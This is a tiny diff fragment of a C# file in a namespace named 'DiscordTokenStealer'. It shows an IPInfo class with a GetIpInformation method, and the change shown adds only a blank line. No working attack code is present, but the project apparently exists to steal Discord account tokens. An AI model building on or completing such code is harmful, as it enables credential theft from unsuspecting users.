@@ -4,6 +4,7 @@ using System.Net.Sockets;
 using System.Text.Json.Serialization;
 
 namespace DiscordTokenStealer;
+
 public static class IPInfo
 {
     private static async Task<IPInformation?> GetIpInformation()
